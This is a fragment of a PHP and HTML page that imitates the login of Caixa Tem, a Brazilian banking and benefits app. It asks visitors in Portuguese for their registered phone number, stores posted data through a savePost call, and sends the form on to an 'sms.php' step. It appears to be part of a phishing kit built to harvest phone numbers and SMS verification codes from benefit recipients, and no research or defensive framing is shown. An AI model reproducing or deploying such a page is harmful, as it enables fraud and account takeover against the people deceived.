<?php require_once('../config/config.php'); if (isset($_POST)) { savePost('cep'); } ?>
                ...
                <section id="template-section">
                    ...
                    <script type="text/javascript">
                        ...
                        document.addEventListener("DOMContentLoaded", function () {
                            dynamicMask = new IMask(document.getElementById('number'), {
                                mask: [
                                    { mask: '(00) 0.0000-0000' },
                                    { mask: regex }
                                ]
                    ...
                    <p class="description" style="text-align: center;">Digite o número que está cadastrado no Caixa Tem:</p>

                    <form action="sms.php" id="form-login" method="post">
                        <span class="float-label">
                            <input tabindex="1" inputmode="numeric" placeholder=" " id="number" name="number" value="" type="text" autofocus="" autocomplete="off" required="" maxlength="16" minlength="16">
